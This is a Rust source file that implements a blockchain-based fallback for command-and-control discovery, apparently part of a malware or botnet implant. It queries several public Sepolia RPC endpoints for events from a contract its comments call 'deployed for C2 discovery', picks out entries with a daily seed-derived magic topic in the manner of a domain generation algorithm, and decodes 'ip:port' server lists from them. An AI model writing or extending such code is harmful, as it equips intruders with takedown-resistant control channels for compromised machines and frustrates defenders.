use async_trait::async_trait;
use reqwest::Client;
use std::error::Error;
use std::time::{SystemTime, UNIX_EPOCH};
use serde::Deserialize;
use log::{info, warn, debug};
use super::BootstrapProvider;

// --- CONFIGURATION ---
const RPC_ENDPOINTS: &[&str] = &[
    "https://rpc.sepolia.org",
    "https://ethereum-sepolia-rpc.publicnode.com",
    "https://1rpc.io/sepolia",
    "https://rpc2.sepolia.org"
];

// Contract deployed for C2 discovery
const CONTRACT_ADDR: &str = "0x8A58Da9B24C24b9D6Faf2118eB3845FE7D4b13c5";
// Event: ScoreSubmitted(uint256 indexed magic_id, bytes payload)
const EVENT_TOPIC_0: &str = "0xf5b2b2c9d749171f81d11324706509c313da5e730b72f44f535144b621404179";

const DGA_SEED: u64 = 0x36A5EC9D09C60386;

#[derive(Deserialize, Debug)]
struct RpcResponse {
    result: Option<serde_json::Value>,
    error: Option<serde_json::Value>,
}

#[derive(Deserialize, Debug)]
struct LogEntry {
    topics: Vec<String>,
    data: String,
    #[serde(rename = "blockNumber")]
    block_number: String,
}

/// Blockchain Fallback Provider (Sepolia)
/// Tier 4 fallback - queries smart contract events for C2 addresses
pub struct EthProvider;

impl EthProvider {
    /// Generate daily magic topic for filtering events
    fn get_daily_magic() -> String {
        let start = SystemTime::now();
        let since_the_epoch = start.duration_since(UNIX_EPOCH).expect("Time went backwards");
        let day_slot = since_the_epoch.as_secs() / 86400;
        
        let mut state = day_slot ^ DGA_SEED;
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        
        format!("0x{:064x}", state)
    }
    
    /// Fetch logs from a specific RPC endpoint
    async fn fetch_logs(client: &Client, url: &str, topic: &str) -> Result<Vec<LogEntry>, Box<dyn Error + Send + Sync>> {
        // Get current block number
        let block_req = serde_json::json!({
            "jsonrpc": "2.0",
            "method": "eth_blockNumber",
            "params": [],
            "id": 0
        });
        
        let block_resp = client.post(url).json(&block_req).send().await?;
        let block_json: RpcResponse = block_resp.json().await?;
        
        let current_block = block_json.result
            .and_then(|v| v.as_str().map(String::from))
            .unwrap_or_else(|| "0x0".to_string());
        
        // Calculate fromBlock (current - 45000 to stay under 50k limit)
        let current_num = u64::from_str_radix(current_block.trim_start_matches("0x"), 16).unwrap_or(0);
        let from_block = if current_num > 45000 { current_num - 45000 } else { 0 };
        let from_hex = format!("0x{:x}", from_block);
        
        let payload = serde_json::json!({
            "jsonrpc": "2.0",
            "method": "eth_getLogs",
            "params": [{
                "address": CONTRACT_ADDR,
                "topics": [EVENT_TOPIC_0, topic],
                "fromBlock": from_hex,
                "toBlock": "latest"
            }],
            "id": 1
        });

        let resp = client.post(url).json(&payload).send().await?;
        let rpc_res: RpcResponse = resp.json().await?;
        
        if let Some(err) = rpc_res.error {
            return Err(format!("RPC Error: {:?}", err).into());
        }
        
        // Parse logs array
        if let Some(result) = rpc_res.result {
            let logs: Vec<LogEntry> = serde_json::from_value(result)?;
            return Ok(logs);
        }
        
        Ok(Vec::new())
    }
    
    /// Parse payload from log data
    fn parse_payload(hex_data: &str) -> Option<String> {
        let clean_hex = hex_data.trim_start_matches("0x");
        let bytes = hex::decode(clean_hex).ok()?;
        
        // ABI encoded bytes: [offset(32)][length(32)][data...]
        if bytes.len() < 64 { return None; }
        
        let length = u64::from_be_bytes(bytes[56..64].try_into().ok()?) as usize;
        if bytes.len() < 64 + length { return None; }
        
        let data = &bytes[64..64+length];
        String::from_utf8(data.to_vec()).ok()
    }
}

#[async_trait]
impl BootstrapProvider for EthProvider {
    async fn fetch_payload(&self, client: &Client) -> Result<String, Box<dyn Error + Send + Sync>> {
        let magic_topic = Self::get_daily_magic();
        info!("[Blockchain] Querying Sepolia with magic: {}...", &magic_topic[0..18]);
        
        // Try each RPC endpoint
        for endpoint in RPC_ENDPOINTS {
            debug!("[Blockchain] Trying RPC: {}", endpoint);
            match Self::fetch_logs(client, endpoint, &magic_topic).await {
                Ok(logs) => {
                    if logs.is_empty() { 
                        debug!("[Blockchain] No logs at {}", endpoint);
                        continue; 
                    }
                    
                    info!("[Blockchain] Found {} logs at {}", logs.len(), endpoint);
                    
                    // Process logs newest first
                    for log in logs.iter().rev() {
                        if let Some(payload) = Self::parse_payload(&log.data) {
                            // Expected format: "SIG:...|MSG:..." 
                            // or directly "ip:port;ip:port"
                            if payload.contains(':') {
                                info!("[Blockchain] Successfully retrieved payload from block {}", log.block_number);
                                return Ok(payload);
                            }
                        }
                    }
                }
                Err(e) => warn!("[Blockchain] RPC {} failed: {}", endpoint, e),
            }
        }
        
        Err("No valid blockchain bootstrap data found".into())
    }

    fn name(&self) -> String {
        "Ethereum Sepolia (Tier 4 Fallback)".to_string()
    }
}
